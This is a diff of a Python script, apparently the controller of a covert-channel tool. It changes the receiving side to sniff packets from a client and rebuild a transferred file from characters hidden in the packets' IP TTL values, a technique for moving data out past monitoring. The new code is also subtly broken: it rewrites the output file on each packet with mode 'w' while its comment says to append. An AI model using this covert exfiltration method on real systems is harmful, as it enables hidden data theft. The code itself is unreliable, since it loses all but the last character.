@@ -231,29 +231,37 @@ if __name__ == '__main__':
                     filename = client_socket.recv(1024).decode()
                     print(constants.RECEIVING_FILE_MSG.format(filename))
 
-                    # Function to extract data from received packets
+                    # Get total count of packets
+                    count = int(client_socket.recv(1024).decode())
+                    print(constants.CLIENT_RESPONSE.format("Total Number of Packets: {}".format(count)))
+
+                    # Function to extract and decode the TTL values to retrieve data
                     def extract_data(packet):
-                        if packet.haslayer("IP"):
-                            ttl = packet.getlayer("IP").ttl
+                        if packet.haslayer('IP'):
+                            ttl = packet[IP].ttl
                             print(ttl)
-                            return ttl  # Retrieve the TTL value
+                            binary_data = format(ttl, '08b')  # Adjust to 8 bits for each character
+                            return binary_data
 
-                    # Function to process the extracted data
-                    def process_data(d, f_name):
-                        if d is not None:
-                            # Convert TTL values to string and write to the file
-                            decoded_data = chr(d)
-                            with open(f_name, 'a') as f:  # Open in append mode
-                                f.write(decoded_data)
-                                print("[+] Data written to {}".format(f_name))
+                    # Function to convert binary data to text
+                    def bin_to_text(binary_data):
+                        text = ''
+                        for i in range(0, len(binary_data), 8):
+                            byte = binary_data[i:i + 8]
+                            if byte != '00000000':  # Ensure not to append null bytes
+                                text += chr(int(byte, 2))
+                        return text
 
-                    # Sniff incoming packets and extract data
-                    def receive_packets():
-                        print("[+] Sniffing packets...")
-                        sniff(prn=lambda x: process_data(extract_data(x), filename), store=0, count=10)
+                    # Callback function for handling received packets
+                    def packet_callback(packet):
+                        binary_data = extract_data(packet)
+                        if binary_data:
+                            text_data = bin_to_text(binary_data)
+                            with open(filename, 'w') as f:  # Use 'a' for appending mode
+                                f.write(text_data)
 
-                    # Start receiving packets
-                    receive_packets()
+                    # Start sniffing for a specific number of packets
+                    sniff(filter="src host {}".format(client_address[0]), prn=packet_callback, count=count)
 
                     # # Send ACK to commander (if good)
                     if is_file_openable(filename):
